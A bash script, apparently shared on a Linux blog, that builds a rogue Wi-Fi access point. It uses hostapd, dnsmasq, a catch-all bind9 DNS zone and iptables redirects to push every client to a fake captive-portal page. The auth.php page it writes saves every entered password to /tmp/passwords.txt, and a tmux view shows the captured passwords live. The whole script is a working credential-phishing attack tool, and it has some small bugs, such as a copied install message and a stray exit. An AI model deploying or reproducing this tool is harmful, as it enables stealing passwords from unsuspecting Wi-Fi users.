#!/bin/bash
# author: demontager
# website: http://nixtalk.com

# Supply www root folder
WWW_ROOT="/var/www/somehost.com"

# Adjust below ones, or keep unchanged it should suffice.
HOSTAPD_CONF="/etc/hostapd_ap.conf"
DNSMASQ_CONF="/etc/dnsmasq.d/ap-hotspot.rules"
NAMED_CONF="/etc/bind/named.conf"
NAMED_ZONE="/etc/bind/catch.all"
GW_IP=192.168.150.1
DHCP_RANGE=192.168.150.2,192.168.150.200,12h
HOSTAPD_LOG="/tmp/hostapd.log"
DEBUG=1

show_info() {
echo -e "\033[1;34m$@\033[0m"
}

show_warn() {
echo -e "\033[1;33m$@\033[0m"
}

show_err() {
echo -e "\033[1;31m$@\033[0m" 1>&2
}

if [[ ! $(whoami) = "root" ]]; then
	show_err "You have to be root to run this script"
	exit 1
fi

if [ $DEBUG = 1 ]; then
	export output=/dev/stdout
else
	export output=/dev/null
fi

dependencies(){
show_info "Checking dependencies..."	
dpkg -l|grep tmux &>$output
if [ `echo $?` != 0 ]; then
  show_warn "Tmux not installed \nTrying to install it automatically...";sleep 2
  apt-get --yes --force-yes install tmux || exit 1
fi
dpkg -l|grep libapache2-mod-php5 &>$output
if [ `echo $?` != 0 ]; then
  show_warn "Apache2 & php not installed \nTrying to install it automatically...";sleep 2
  apt-get --yes --force-yes install libapache2-mod-php5 || exit 1
  exit 1
fi
dpkg -l|grep bind9 &>$output
if [ `echo $?` != 0 ]; then
  show_warn "Bind9 not installed \nTrying to install it automatically...";sleep 2
  apt-get --yes --force-yes install bind9 || exit 1
fi
dpkg -l|grep hostapd &>$output
if [ `echo $?` != 0 ]; then
  show_warn "Bind9 not installed \nTrying to install it automatically...";sleep 2
  apt-get --yes --force-yes install hostapd || exit 1
fi
dpkg -l|grep dnsmasq &>$output
if [ `echo $?` != 0 ]; then
  show_warn "DNSmasq not installed \nTrying to install it automatically...";sleep 2
  apt-get --yes --force-yes install dnsmasq || exit 1
fi
show_warn "Services - [OK]"

# Check if the iface supports Access Point mode.
if [[ ! $(iw list 2>&1 | grep -A6 "Supported interface modes" | grep AP$) ]]; then
  show_err "Your wireless card does not support Access Point mode"
	exit 1
else 
  show_warn "Access Point mode supported - [OK]"
  echo " "   
fi
}


start() {
network(){	
show_warn "1. Specify wifi iface to start AccessPoint [wlan0,wlan1...], or enter to use wlan0 "
read iface
show_warn "2. Specify AccessPoint name, or enter to use \"My-AP\" "
read ssid
if [ -z $iface ]; then
  iface="wlan0"
fi
if [ -z $ssid ]; then
  ssid="My-AP"
fi
cat > $HOSTAPD_CONF <<EOF
# WiFi Hotspot
interface=$iface
driver=nl80211
#Access Point
ssid=$ssid
hw_mode=g
# WiFi Channel:
channel=1
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF

cat > "$DNSMASQ_CONF" <<EOF
# Disable DNS
port=0
bind-interfaces
# Choose interface for binding
interface=$iface
# Specify range of IP addresses for DHCP leasses
dhcp-range=$DHCP_RANGE
EOF
chmod +x "$DNSMASQ_CONF"

ifconfig "$iface" "$GW_IP"
service hostapd stop &>$output;killall hostapd &>$output; sleep 1; killall hostapd &>$output
service dnsmasq stop &>$output
service dnsmasq restart &>$output
hostapd -B "$HOSTAPD_CONF" -f "$HOSTAPD_LOG"
iptables -F -t nat
iptables -t nat -A PREROUTING -p tcp -m multiport --destination-port 8080,80,443 -j DNAT --to-destination $GW_IP:80
sysctl net.ipv4.ip_forward=1 &>$output
cat > "$NAMED_CONF" << EOF
zone "." {
        type master;
        file "/etc/bind/catch.all";
};
EOF
cat > "$NAMED_ZONE" << EOF
\$TTL    604800

@       IN      SOA     .       root.localhost. (
                                1       ; Serial
                                604800  ; Refresh
                                86400   ; Retry
                                2419200 ; Expire
                                604800  ; Negative TTL
                                )
        IN      NS      .
.       IN      A       $GW_IP
*.      IN      A       $GW_IP
EOF
service bind9 restart &>$output
service apache2 restart &>$output
}

php_form(){
if [ ! -e /tmp/passwords.txt ]; then
  touch /tmp/passwords.txt
fi  	
cat > $WWW_ROOT/index.php << 'EOF'
<form name="form1" method="post" action="auth.php"> 
Enter password to access Internet: <input type="text" name="pass"><br>
<input type="submit" name="Submit" value="Sign Up"> </form>
EOF
cat > $WWW_ROOT/auth.php << 'EOF'
<?php
$password = $_POST['pass'];

$today = date("F j, H:i:s");
$data = "$today\n$password\n";

$fh = fopen("/tmp/passwords.txt", "a");
fwrite($fh, $data);

fclose($fh);
print "Waiting authorization.....";
?>
EOF
cat > $WWW_ROOT/.htaccess << 'EOF'
ErrorDocument 404 /index.php
ErrorDocument 405 /index.php
ErrorDocument 408 /index.php
ErrorDocument 410 /index.php
ErrorDocument 411 /index.php
ErrorDocument 412 /index.php
ErrorDocument 413 /index.php
ErrorDocument 414 /index.php
ErrorDocument 415 /index.php
ErrorDocument 500 /index.php
ErrorDocument 501 /index.php
ErrorDocument 502 /index.php
ErrorDocument 503 /index.php
ErrorDocument 506 /index.php
EOF
}

monitor_ex(){
SESSIONNAME="monitoring"
killall tmux
tmux has-session -t $SESSIONNAME > /dev/null
if [ $? != 0 ]; then  
  tmux new-session -s $SESSIONNAME -n monitor -d
    tmux send-keys "tailf /tmp/passwords.txt" C-m
    tmux split-window -t $SESSIONNAME:0 -h
    tmux send-keys "tailf /tmp/hostapd.log" C-m
    tmux split-window -t $SESSIONNAME:0 -h
    tmux send-keys "tailf /var/log/syslog" C-m
    tmux split-window -t $SESSIONNAME:0 -h
fi
tmux select-layout tiled
tmux send-keys '/tmp/control.sh' 'C-m'
tmux select-window -t $SESSIONNAME:0
tmux attach -t $SESSIONNAME
}

control_ex() {
controlf="/tmp/control.sh"
cat << EOF > "$controlf"
#!/bin/bash
printf "\033c"
echo " "; clear
echo "************Press Enter or any key to Exit"
read input
tmux kill-server
EOF
chmod +x "$controlf"
}
network
php_form
control_ex
show_warn "Starting live monitoring..."; sleep 3
monitor_ex
stop
}

stop() {
WLAN=$(ifconfig|egrep -w 'mon.*' /tmp/net.txt|awk -F. '{print $2}'|awk '{print $1}')	
service hostapd stop; killall hostapd &>$output; sleep 2; killall hostapd &>/dev/null	
iptables -F -t nat
ifconfig $(ifconfig|egrep -w 'mon.*'|awk '{print $1}') down &>/dev/null
ifconfig "$WLAN" down
ifconfig "$WLAN" up
sysctl net.ipv4.ip_forward=0 &>$output
service dnsmasq stop
service bind9 stop
service apache2 stop
}

msg() {
echo "No such option: use start/stop"	
}

case "$1" in
	start)
	dependencies
	start
	;;
	stop)
	stop
	;;
	*)
	msg
esac	
